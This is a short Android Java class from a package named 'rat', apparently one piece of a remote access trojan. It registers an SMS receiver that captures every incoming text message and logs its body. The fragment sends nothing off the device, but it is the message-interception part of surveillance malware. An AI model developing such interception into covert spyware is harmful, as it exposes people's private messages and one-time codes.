package com.score.rat;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.provider.Telephony;
import android.telephony.SmsMessage;
import android.util.Log;

public class RecieveIntent extends BroadcastReceiver{

    public void onReceive(Context context, Intent intent){
        if(Telephony.Sms.Intents.SMS_RECEIVED_ACTION.equals(intent.getAction())){
            for (SmsMessage smsMessage : Telephony.Sms.Intents.getMessagesFromIntent(intent)){
                Log.d("RAT", smsMessage.getMessageBody());
            }
        }
    }
}
